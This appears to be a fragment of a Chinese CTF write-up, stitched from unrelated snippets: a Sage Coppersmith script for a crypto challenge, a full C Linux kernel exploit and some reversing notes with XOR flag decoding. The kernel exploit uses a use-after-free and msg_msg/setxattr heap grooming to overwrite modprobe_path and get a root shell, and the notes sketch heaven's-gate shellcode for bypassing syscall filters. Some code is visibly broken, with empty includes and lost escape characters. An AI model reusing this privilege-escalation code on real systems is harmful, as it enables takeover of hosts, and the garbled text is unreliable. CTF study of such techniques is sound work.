y = [4806088655232032640131815968035322182275006692259183095737832095267524825650586709163929120708376642687256768447965710629080349200588181928595678047040880789724971817059358396163096713153272213427522822058891798994246279675546478741928529988967946204452767371906673286827596885891268683555890521866220464996, 36427308113569747526874637238611956674658176451423982942908576371079856193061929116763841738289478269762767309956202920564091203721624520590467722449528903731839566008139942787078693680673776528179554827688651298887826999553050429188191123121557929147839173277183786286467590000199719564184235204795732718072, 22671172019607699010808242481239740857130309731255435371908887956593421434992512079790234625706350568447858868609783480724200167840452748080516811720426420974312708628131116060025172282266118472961472876873141994049733918908550242475246834408823242506072794063563809180873166212417405862218538966602792514167, 644361727747632626598826890581163999609668835723437298040290901674278545143549378125708738964569230174723374335762192451734784904542916232268939865691930798231529455733298867239440319451124463937678028231210599360468666533601195511935168705936295829890653739823139986804039319543460282204539256406399080821]

def paragen(x0,a,b,y,n):
    return [int(i%n) for i in [x0*x0*x0+a*x0+b-y*y,3*x0*x0+a,3*x0]]

x0 = bytes_to_long(b'flag{' + b'x00'*123)
cnt = 0
PR.<x> = PolynomialRing(Zmod(prod(N)))
for s in range(20):
    print(s)
    for i in range(s+1):
        for j in range(s-i+1):
            f0 = paragen(x0,a[0],b[0],y[0],N[0])
            f1 = paragen(x0+i,a[1],b[1],y[1],N[1])
            f2 = paragen(x0+i+j,a[2],b[2],y[2],N[2])
            f3 = paragen(x0+s,a[3],b[3],y[3],N[3])
            f = x^3 + sum([crt([f0[i],f1[i],f2[i],f3[i]],N)*x^i for i in range(3)])
            ans = f.small_roots(X=2**984)
            if ans:
                print(s,i,j,ans)
                for k in ans:
                    print(long_to_bytes(x0+k))
    #define _GNU_SOURCE
    #include <err.h>
    #include <errno.h>
    #include <fcntl.h>
    #include 
    #include <sched.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <net/if.h>
    #include <netinet/in.h>
    #include <sys/ipc.h>
    #include <sys/msg.h>
    #include <sys/socket.h>
    #include <sys/syscall.h>
    #include <linux/netfilter_ipv4/ip_tables.h>
    #include <stdint.h>
    #include <sys/mman.h>
    #include <signal.h>
    #include <sys/prctl.h>
    #define SIZE 0x60
size_t user_cs, user_ss, user_rflags, user_sp;
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
long int data[0x400];
size_t modprobe_path = 0;
uint64_t kernel_base = 0;
uint64_t raceSign = 0;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get_shell(void){
    system("/bin/sh");
}

void getroot()
{
    void *(*pkc)(void *) = prepare_kernel_cred;
    void (*cc)(void *) = commit_creds;

    cc(pkc(0));
}
void swapgs_iretq()
{
    __asm__("swapgs;"
            "iretq;");
}
void spawn_shell()
{    
    system("/bin/sh");
}
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int edit(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x40,arg);
}
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

int add_msg(int msqid, const void *msgp, size_t msgsz) {
    if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    return 0;
}

int show_msg(int msqid, void *msgp, size_t msgsz,long count) {
    if (msgrcv(msqid, msgp, msgsz, count, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
int show_buf(uint64_t *buf,uint64_t size){
    for(int i = 0;i<size;i++){
        printf("%d ==> %llxn",i,*(uint64_t*)(buf + i*8));
    }
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void modprobe_hax()
{
        system("echo '#!/bin/sh' > /tmp/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
        system("chmod +x /tmp/x");
        int ff = open("/tmp/asd", O_WRONLY|O_CREAT);
        write(ff, "xffxffxffxff", 4);
        close(ff);
        system("chmod 777 /tmp/asd; /tmp/asd");
        system("sh");
}
uint64_t pop_rdi,pop_rsi,pop_rdx,swapgs,iretq,jmp_rsi,leaver,work_for_cpu_fn;
uint64_t tmp_idx,tmp_idx1;
int fd;
int main(){
    signal(SIGSEGV, spawn_shell);
    signal(SIGTRAP, spawn_shell);
    save_status();
    fd = open("/dev/kernelpwn",0);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    char *buf = calloc(1,0x4000);
    memset(buf,'b',0x1000);
    int pid[0x100] = {0};
    for(int i = 0;i<100;i++){
        pid[i] = msg_get();
    }
    add(fd,buf);
    msgbuf.mtype = 0x66;
    memset(msgbuf.mtext,'a',0x100);
    if (msgsnd(pid[0], &msgbuf, 0x60-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    del(fd,0);
    if (msgsnd(pid[1], &msgbuf, 0x60-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    msgbuf.mtype = 0x2;
    memset(msgbuf.mtext,'a',0x100);
    if (msgsnd(pid[0], &msgbuf, 0x80-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    if (msgsnd(pid[1], &msgbuf, 0x80-0x30, 0) < 0) {
        perror("[-] msgsnd");
        return -1;
    }
    edit(fd,'x00');
    free_msg(pid[1],buf,0x80-0x30,0x2);
    *(uint64_t*)buf = NULL; //rdx
    *(uint64_t*)(buf+8*1) = NULL;//rax
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    setxattr("/tmp","aaaa",buf,0x80,1);
    memset(buf,'x00',0x1000);
    show_msg(pid[1],buf,0x1000-0x30,1);
       uint64_t heap_addr = *(uint64_t*)(buf + 11*8);
       printf("heap_addr => %llxn",heap_addr);
       if(heap_addr == 0){
           puts("NONONO");
           _exit(0);
       }
       uint64_t heap_base = heap_addr & 0xfffffffff0000000;
       int off = 0;
    while(!(heap_addr >> (32 - off*8) & 2)) ++off;
    *(uint64_t*)buf = heap_addr; //rdx
    *(uint64_t*)(buf+8*1) = heap_base + 0x11e89d0 + off;//rax
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x80-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    setxattr("/tmp","aaaa",buf,0x80,1);
    free_msg(pid[1],buf,0x80-0x30,2);
    int fd1 = open("/proc/sys/kernel/modprobe",O_WRONLY);
    if(fd1 < 0){
        perror("open");
        _exit(0);
    }
    write(fd1, "/tmp/x", 6);
    modprobe_hax();
    spawn_shell();

}
__int64 sub_7F9()
{
  close(1);
  close(2);
  return sub_7CA();
}
1.需要用到天堂之门切换位数绕过系统调用号检测，在这之前需要用mmap开启一段可执行空间，直接在栈上执行天堂之门会无法执行
2.在mmap出来的区段写上32 to 64的天堂之门shellcode然后open flag 和run.sh(或者pwn文件)
接着再用64 to 32的天堂之门切换到64位把flag读入到mmap区段，再接着切换到32位把flag write到run.sh(或者pwn文件)
3.由于程序有Xinetd守护进程，不会导致容器重置，下次nc直接get flag
08049857                 cmovnz  edx, edi
0804990D                 xor     [eax+edx*4+10h], ecx
[0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7, 
    18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]
>>> arr = [0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7,
...     18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]
>>> flag = bytes([each ^ 0x66 for each in arr])
>>> flag
b'flag{CongratzUGuessedItCorrectlly}'
003480CD     | 8B4D 08           | mov ecx,dword ptr ss:[ebp+8]                |
003480D0     | C70424 0A000000   | mov dword ptr ss:[esp],A                    | A:'n'
003480D7     | 894C24 04         | mov dword ptr ss:[esp+4],ecx                |
003480DB     | 894424 08         | mov dword ptr ss:[esp+8],eax                |
003480DF     | E8 0C000000       | call truevm.3480F0                        |
003480E4     | 83C4 10           | add esp,10                                  |
003480E7     | 5D                | pop ebp                                     |
003480E8     | C3                | ret                                         |
003480E9     | 0F1F80 00000000   | nop dword ptr ds:[eax],eax                  |
003480F0     | E9 A1803000       | jmp truevm.650196                         |
.truevm.exe
ef631455b1274f21a6c26f87332d8a22
Correct
flag{ef631455b1274f21a6c26f87332d8a22}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668681957.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1668681958.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1668681959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668681959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668681959.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1668681960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1668681960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668681960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668681960.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668681961.png)